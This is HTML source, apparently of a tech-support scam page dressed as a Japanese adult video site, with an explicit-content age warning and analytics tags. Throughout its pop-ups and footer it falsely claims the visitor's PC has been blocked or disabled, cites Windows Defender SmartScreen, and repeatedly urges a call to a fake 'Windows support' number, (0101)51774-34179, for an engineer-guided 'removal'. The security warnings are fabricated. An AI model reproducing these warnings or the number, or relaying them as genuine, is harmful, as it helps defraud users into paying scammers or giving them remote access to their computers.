...
<html lang="en">
  <head>
      <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1YM2408VZ3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-1YM2408VZ3');
</script>
<!-- Google Tag Manager -->
...
})(window,document,'script','dataLayer','GTM-P3594B6Q');</script>
<!-- End Google Tag Manager -->
<!-- Fathom - beautiful, simple website analytics -->
                <script src="https://cdn.usefathom.com/script.js" data-site="DONONPVS" defer></script>
              <!-- / Fathom -->

    <meta charset="utf-8">
    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
    <meta content="noindex,nofollow" name="robots">
    <title>無料の日本人ポルノビデオ-JAT</title>
    <link rel="shortcut icon" href="https://content.sexflirtbook.com/sexflirtbook/apple-touch/favicon.ico" type="image/x-icon"/>
...
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P3594B6Q"
...
<div class="innerContainer">
    ...
    <span aria-hidden="true">X</span>
      ...
      <p style=" position: center; font-size: 16px; color: black;">Close & Play</p> </center>-->
              ...
              <p style="font-size:12px;">露骨なコンテンツ (ポルノ) を含む Web サイトに入ろうとしています。 この Web サイトには、18 歳以上、または地域の法域でかかるコンテンツを閲覧できる法定年齢のいずれか大きい方のみがアクセスしてください。 さらに、未成年者に本サイトまたはサービスへのアクセスを許可しないことを表明し、承認するものとします。 </p>
   ...
   border-color: #007bff;">
      ...
      <div class="row">
        <div class="col-md-12">
          <div class="right-foot" style="text-align:center">
            ...
            <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows サポートに電話する: <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> (0101)51774-34179
              </span>
            </span>
          </div>
        </div>
    ...
    <div class="lightbox" id="poptxt" style="display: block;">
      ...
      <div id="disclaimer">この PC へのアクセスはセキュリティ上の理由からブロックされています.  <br>
        <span class="support" style="font-size:22px;">Windows サポートに電話してください:<br><span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> (0101)51774-34179
          </span>
        </span>
      </div>
      <div id="bottom">
    ...
    <div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new">
      ...
      <p style="padding-bottom:0;color:#fff;font-size:16px">Windows サポートに電話する: <strong>
          <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">(0101)51774-34179
          </span>
        </strong>
      </p>
    ...
    <div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
      <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">すぐに当社にご連絡ください。当社のエンジニアが電話で削除プロセスを案内いたします。お使いのコンピュータは無効になっています。Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、PC が危険にさらされる可能性があります。 <br>
        <strong>Windows サポートに電話する: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> (0101)51774-34179
          </span>
        </strong>
      </p>
    </div>
    <div id="chat" style="display: block;">
      ...
      <h4 style="font-weight:600;font-size:22px"> (0101)51774-34179
        <br>(セキュリティサポート)
      </h4>
